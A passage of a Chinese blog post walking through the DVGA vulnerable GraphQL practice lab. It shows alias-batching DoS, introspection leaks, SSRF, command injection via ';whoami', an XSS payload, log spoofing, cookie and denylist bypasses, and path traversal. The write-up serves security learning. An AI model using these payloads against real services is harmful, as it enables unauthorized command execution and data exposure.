+<h2 id="拒绝服务-重命名-bypass"><a href="#拒绝服务-重命名-bypass" class="headerlink" title="拒绝服务 - 重命名 bypass"></a>拒绝服务 - 重命名 bypass</h2><p>假如说服务端有对批处理进行限制，但未获取其重命名的在进行限制的话，可通过重命名的方式进行 bypass，这里就算是 expert 模式，也可以通过这个进行 bypass</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  q1 :systemUpdate</span><br><span class="line">  q2 :systemUpdate</span><br><span class="line">  q3 :systemUpdate</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意 <code>:</code> 符号要贴着 <code>systemUpdate</code> ，因为靶场在中间件中的获取请求字段的方式为，他根据是否为纯数字字母来进行判断。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fields_from_query</span>(<span class="params">q</span>):</span></span><br><span class="line">  fields = [k <span class="keyword">for</span> k <span class="keyword">in</span> q.split() <span class="keyword">if</span> k.isalnum()]</span><br><span class="line">  <span class="keyword">return</span> fields</span><br></pre></td></tr></table></figure>
+
+<p>然后在 graphql 的处理中，是可以正常进行解析的。</p>
+<h2 id="信息泄漏-开启缺省模式"><a href="#信息泄漏-开启缺省模式" class="headerlink" title="信息泄漏 - 开启缺省模式"></a>信息泄漏 - 开启缺省模式</h2><p>缺省查询可以通过指定 <code>__schema</code> 来查询目前所支持的查询方式和查询名称</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    queryType &#123; name &#125;</span><br><span class="line">    mutationType &#123; name &#125;</span><br><span class="line">    subscriptionType &#123; name &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比如查询 query 不一定叫做 <code>Query</code> ，修改操作不一定叫做 <code>Mutation</code>，比如在这里，修改操作就叫做 <code>Mutations</code>，所以一般先查 <code>__schema</code>, 然后就可以查看所有数据类型和接口查询方式了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __type (name: <span class="string">&quot;Query&quot;</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    fields &#123;</span><br><span class="line">      name</span><br><span class="line">      type &#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">        ofType &#123;</span><br><span class="line">          name</span><br><span class="line">          kind</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体某种类型可以通过修改为 <code>__type (name: &quot;PasteObject&quot;)</code> 即可查询 <code>PasteObject</code> 的数据结构，这样还不足以查看 mutation 的访问和 subscription 的访问，可以像下面这样</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    queryType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    mutationType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    subscriptionType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    types &#123;</span><br><span class="line">      ...FullType</span><br><span class="line">    &#125;</span><br><span class="line">    directives &#123;</span><br><span class="line">      name</span><br><span class="line">      description</span><br><span class="line">      locations</span><br><span class="line">      args &#123;</span><br><span class="line">        ...InputValue</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment FullType on __Type &#123;</span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  fields(includeDeprecated: <span class="literal">true</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    args &#123;</span><br><span class="line">      ...InputValue</span><br><span class="line">    &#125;</span><br><span class="line">    type &#123;</span><br><span class="line">      ...TypeRef</span><br><span class="line">    &#125;</span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  &#125;</span><br><span class="line">  inputFields &#123;</span><br><span class="line">    ...InputValue</span><br><span class="line">  &#125;</span><br><span class="line">  interfaces &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">  enumValues(includeDeprecated: <span class="literal">true</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  &#125;</span><br><span class="line">  possibleTypes &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment InputValue on __InputValue &#123;</span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  type &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">  defaultValue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment TypeRef on __Type &#123;</span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  ofType &#123;</span><br><span class="line">    kind</span><br><span class="line">    name</span><br><span class="line">    ofType &#123;</span><br><span class="line">      kind</span><br><span class="line">      name</span><br><span class="line">      ofType &#123;</span><br><span class="line">        kind</span><br><span class="line">        name</span><br><span class="line">        ofType &#123;</span><br><span class="line">          kind</span><br><span class="line">          name</span><br><span class="line">          ofType &#123;</span><br><span class="line">            kind</span><br><span class="line">            name</span><br><span class="line">            ofType &#123;</span><br><span class="line">              kind</span><br><span class="line">              name</span><br><span class="line">              ofType &#123;</span><br><span class="line">                kind</span><br><span class="line">                name</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可参考下链接参考各种语言禁用缺省查询</p>
+<p><a target="_blank" rel="noopener" href="https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/">https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/</a></p>
+<h2 id="信息泄漏-开发环境"><a href="#信息泄漏-开发环境" class="headerlink" title="信息泄漏 - 开发环境"></a>信息泄漏 - 开发环境</h2><p>直接访问 <a target="_blank" rel="noopener" href="http://tari.local:5000/graphiql">http://tari.local:5000/graphiql</a> ，因为 graphql 有一个集成等开发环境，方便调试用的</p>
+<h2 id="信息泄漏-字段提示"><a href="#信息泄漏-字段提示" class="headerlink" title="信息泄漏 - 字段提示"></a>信息泄漏 - 字段提示</h2><p>当我们输入错误的 field 字段时，graphql 会提示与这个字段相似的字段名称</p>
+<p>输入</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  system</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;errors&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Cannot query field \&quot;system\&quot; on type \&quot;Query\&quot;. Did you mean \&quot;pastes\&quot;, \&quot;paste\&quot;, \&quot;systemUpdate\&quot; or \&quot;systemHealth\&quot;?&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;locations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;line&quot;</span>: <span class="number">2</span>,</span><br><span class="line">          <span class="attr">&quot;column&quot;</span>: <span class="number">3</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见回显了 system 相关的一些接口</p>
+<p>利用工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nikitastupin/clairvoyance">https://github.com/nikitastupin/clairvoyance</a></p>
+<h2 id="信息泄漏-SSRF"><a href="#信息泄漏-SSRF" class="headerlink" title="信息泄漏 - SSRF"></a>信息泄漏 - SSRF</h2><p><code>importPaste</code> mutation 用到了 curl 探测主机存活</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">    importPaste(host: <span class="string">&quot;127.0.0.1&quot;</span>, port: <span class="number">80</span>, path: <span class="string">&quot;/&quot;</span>, scheme: <span class="string">&quot;http&quot;</span>) &#123;</span><br><span class="line">        result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要是熟悉下 mutation 的请求方式</p>
+<h2 id="注入类-命令-amp-XSS-amp-HTML注入"><a href="#注入类-命令-amp-XSS-amp-HTML注入" class="headerlink" title="注入类 - 命令 &amp; XSS &amp; HTML注入"></a>注入类 - 命令 &amp; XSS &amp; HTML注入</h2><p>第1个命令注入：<code>importPaste</code> mutation 直接使用命令拼接</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">    importPaste(host: <span class="string">&quot;127.0.0.1&quot;</span>, port: <span class="number">80</span>, path: <span class="string">&quot;/;whoami&quot;</span>, scheme: <span class="string">&quot;http&quot;</span>) &#123;</span><br><span class="line">        result</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同 ssrf 熟悉下 mutation 的请求方式</p>
+<p>第2个命令注入：postman写好挂个上游代理到burp爆破出密码（或者 graphiql 写好burp抓包均可），然后传入cmd命令执行即可</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    systemDiagnostics(username: <span class="string">&quot;admin&quot;</span>, password: <span class="string">&quot;admin123&quot;</span>, cmd: <span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意每次启动，password 都会从下面几个中随机选一个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;changeme&#x27;</span>, <span class="string">&#x27;password54321&#x27;</span>, <span class="string">&#x27;letmein&#x27;</span>, <span class="string">&#x27;admin123&#x27;</span>, <span class="string">&#x27;iloveyou&#x27;</span>, <span class="string">&#x27;00000000&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/graphql-dvga/image-20220128175651539.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220128175651539.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220128175651539"></p>
+<p>XSS：在页面 Create Paste 插入XSS代码即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">console.log(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>HTML 注入，与XSS一样，即注入 HTML 代码</p>
+<h2 id="注入类-日志欺骗"><a href="#注入类-日志欺骗" class="headerlink" title="注入类 - 日志欺骗"></a>注入类 - 日志欺骗</h2><p>日志记录通过 <code>Audit.create_audit_entry(gqloperation=helpers.get_opname(info.operation))</code> 记录日志，断点跟进 <code>helpers.get_opname</code> 方法，可知最终获取到的为操作名称，如果获取不到，则记录为 <code>&quot;No Operation&quot;</code>。比如</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query pwned &#123;</span><br><span class="line">  systemHealth</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>记录为 <code>pwned</code></p>
+<p><img src="/img/graphql-dvga/image-20220126224219767.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220126224219767.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220126224219767"></p>
+<p> <code>CreatePaste</code> 通过抓包可以发现请求包为 <code>mutation CreatePaste (....</code> 直接改包会发现请求解析有问题或者日志篡改不了。通过自己构造请求 </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mutation nonoPaste &#123;</span><br><span class="line">    createPaste (title: <span class="string">&quot;good&quot;</span>, content: <span class="string">&quot;oah&quot;</span>, public: <span class="literal">true</span>, burn: <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paste &#123;</span><br><span class="line">          pId</span><br><span class="line">          content</span><br><span class="line">          title</span><br><span class="line">          burn</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>
+
+<p>则可以把日志篡改为 <code>nonoPaste</code></p>
+<p><img src="/img/graphql-dvga/image-20220126225820428.png" class="lazyload" data-srcset="/img/graphql-dvga/image-20220126225820428.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220126225820428"></p>
+<p>Emmm，其实专家模式也有点问题，虽然指定了白名单，但</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mutation getPastes &#123;</span><br><span class="line">    createPaste (title: <span class="string">&quot;good&quot;</span>, content: <span class="string">&quot;oaaaaah&quot;</span>, public: <span class="literal">true</span>, burn: <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paste &#123;</span><br><span class="line">          pId</span><br><span class="line">          content</span><br><span class="line">          title</span><br><span class="line">          burn</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>
+
+<p>这样子还是记录错日志了啊（</p>
+<h2 id="认证绕过-graphiql-界面保护-bypass"><a href="#认证绕过-graphiql-界面保护-bypass" class="headerlink" title="认证绕过 - graphiql 界面保护 bypass"></a>认证绕过 - graphiql 界面保护 bypass</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IGQLProtectionMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"><span class="meta">  @run_only_once</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">self, <span class="built_in">next</span>, root, info, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> helpers.is_level_hard():</span><br><span class="line">      <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;GraphiQL is disabled&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;env&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cookie <span class="keyword">and</span> cookie == <span class="string">&#x27;graphiql:enable&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;GraphiQL Access Rejected&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在 信息泄漏 - 开发环境 ，其实虽然 graphiql 页面可以访问，但其实是用不了的，如上代码段，保护方式为获取Cookie env字段是否为 <code>graphiql:enable</code></p>
+<h2 id="查询黑名单-bypass"><a href="#查询黑名单-bypass" class="headerlink" title="查询黑名单 bypass"></a>查询黑名单 bypass</h2><p>这一关需要修改一下 core/views.py 文件，注释 OpNameProtectionMiddleware 中间件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gql_middlew = [</span><br><span class="line">  middleware.CostProtectionMiddleware(),</span><br><span class="line">  middleware.DepthProtectionMiddleware(),</span><br><span class="line">  middleware.IntrospectionMiddleware(),</span><br><span class="line">  middleware.processMiddleware(),</span><br><span class="line">  <span class="comment"># middleware.OpNameProtectionMiddleware()</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">processMiddleware</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">self, <span class="built_in">next</span>, root, info, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> helpers.is_level_easy():</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br><span class="line"></span><br><span class="line">    array_qry = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> info.context.json <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">isinstance</span>(info.context.json, <span class="built_in">dict</span>):</span><br><span class="line">        array_qry.append(info.context.json)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> q <span class="keyword">in</span> array_qry:</span><br><span class="line">        query = q.get(<span class="string">&#x27;query&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> security.on_denylist(query):</span><br><span class="line">          <span class="keyword">raise</span> werkzeug.exceptions.SecurityError(<span class="string">&#x27;Query is on the Deny List.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(root, info, **kwargs)</span><br></pre></td></tr></table></figure>
+
+<p>因 <code>on_denylist</code> 方法通过分割空白字符后拼接在判断查询是否在黑名单内</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_denylist</span>(<span class="params">query</span>):</span></span><br><span class="line">  normalized_query = <span class="string">&#x27;&#x27;</span>.join(query.split())</span><br><span class="line">  queries = [</span><br><span class="line">    <span class="string">&#x27;query&#123;systemHealth&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#123;systemHealth&#125;&#x27;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> normalized_query <span class="keyword">in</span> queries:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<p>当然查询为 </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">query good&#123;</span><br><span class="line">    systemHealth</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就会变成 <code>querygood&#123;systemHealth&#125;</code> 进而避开黑名单</p>
+<h2 id="杂项-目录穿越"><a href="#杂项-目录穿越" class="headerlink" title="杂项 - 目录穿越"></a>杂项 - 目录穿越</h2><p>普通目录穿越</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutation &#123;</span><br><span class="line">  uploadPaste(filename:<span class="string">&quot;../../../../../tmp/file.txt&quot;</span>, content:<span class="string">&quot;hi&quot;</span>)&#123;</span><br><span class="line">    result</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>除了配置不当、越权或未授权，这个靶场没咋提及，tari感觉拒绝服务相对来说在GraphQL中算是比较有特色些的问题了</p>
+<p>当然除了靶场中涉及的，还有像GraphQL注入、CSRF也是不错的姿势，不过靶场没涉及，有兴趣的通过可以戳</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p>
+<p>tari也是刚接触GraphQL不久，欢迎交流～</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/p/2022/graphql-dvga/>https://tari.moe/p/2022/graphql-dvga/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/GraphQL/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>GraphQL</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/p/2022/sqli-labs/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>sqli-labs 靶场 1-65 通关记</p>
+          <p class='content'>前言好耶✌️！从2021年立下flag的sqli-labs靶场终于给刷完了，不得不说经典永远是经典，边刷边闻到了许多CTF题的味道。去年初的时候就把前20关给刷了，后面跑去刷ctfshow和干其...</p>
+        </a>
+      
+      
+        <a class='next' href='/p/2021/2021summury/'>
+          <p class='title'>告别2021<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+本来想着春节在写的，看到大家都写了，跟风一下，2333
+3-5月 毕设&amp;论文年后先回公司两周，实习期满3月后回校开始做毕设和写论文，因实习期间做Python代码审计较多，想着能否编写...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
